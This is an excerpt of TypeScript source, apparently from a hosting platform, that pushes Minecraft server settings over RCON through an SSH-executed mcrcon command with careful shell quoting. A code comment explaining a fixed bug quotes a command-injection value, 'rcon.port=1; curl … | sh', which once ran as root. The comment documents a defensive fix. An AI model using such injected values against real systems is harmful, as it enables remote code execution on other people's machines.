801	/**
802	 * Best-effort Minecraft RCON push. Reads rcon config from the (updated)
803	 * server.properties; if RCON is enabled, a password is set, and `mcrcon` exists
804	 * on the box, pushes the live-editable settings. Anything missing → note a restart.
805	 */
806	async function tryMinecraftRcon(conn: Client, props: string, v: Values, notes: string[]): Promise<void> {
807	  const kv = parseKeyValue(props);
808	  const enabled = kv["enable-rcon"] === "true";
809	  const password = kv["rcon.password"] ?? "";
810	  // `rcon.port` is read out of the CUSTOMER'S OWN server.properties, on the
811	  // customer's own VM — an attacker-controlled string in every sense, and one
812	  // this platform never wrote. Only a TCP port number can ever be legitimate, so
813	  // anything that is not one is discarded rather than escaped. `shq` and the
814	  // quoting below are the second and third lines of defence; this is the first,
815	  // and it is the only one that does not depend on getting quoting right.
816	  const port = rconPort(kv["rcon.port"]);
817	  if (!enabled || !password) {
818	    notes.push("RCON is not enabled — restart the server to apply the new settings live.");
819	    return;
820	  }
821	  const which = await execRemote(conn, "command -v mcrcon || true");
822	  if (!which.stdout.trim()) {
823	    notes.push("RCON is enabled but `mcrcon` is not installed — restart to apply live.");
824	    return;
825	  }
826	
827	  // A conservative set of safe live commands. TODO(rcon): expand once the exact
828	  // runtime command set is verified for the target Minecraft build.
829	  const cmds: string[] = [];
830	  if (v["difficulty"] != null) cmds.push(`difficulty ${String(v["difficulty"])}`);
831	  if (v["white-list"] != null) cmds.push(`whitelist ${bool(v["white-list"]) === "true" ? "on" : "off"}`);
832	  if (v["pvp"] != null || v["max-players"] != null || v["motd"] != null) cmds.push("reload");
833	  if (cmds.length === 0) return;
834	
835	  const quoted = cmds.map((c) => `'${shq(c)}'`).join(" ");
836	  // EVERY interpolation is inside single quotes. `shq` escapes a value for use
837	  // INSIDE a single-quoted string — it is not a quoter, and a bare `${shq(x)}`
838	  // is simply an unquoted, word-splitting, metacharacter-honouring shell
839	  // argument. `-P` was written that way, so `rcon.port=1; curl … | sh` in the
840	  // customer's own server.properties ran as root on the hypervisor's SSH client
841	  // target with no further steps required.
842	  //
843	  // The `|| true` that used to end this line is gone. It forced exit 0, so the
844	  // `res.code === 0` test below was a constant and this function reported
845	  // "Pushed live settings via RCON." whether mcrcon worked, refused the
846	  // password, or was never reached. `execRemote` resolves with the real exit
847	  // code rather than rejecting, so nothing here can throw on a non-zero status —
848	  // the note just becomes true.
849	  const res = await execRemote(
850	    conn,
851	    `mcrcon -H 127.0.0.1 -P '${shq(port)}' -p '${shq(password)}' ${quoted} 2>&1`
852	  );
853	  notes.push(res.code === 0 ? "Pushed live settings via RCON." : "RCON push attempted (some settings may need a restart).");
854	}
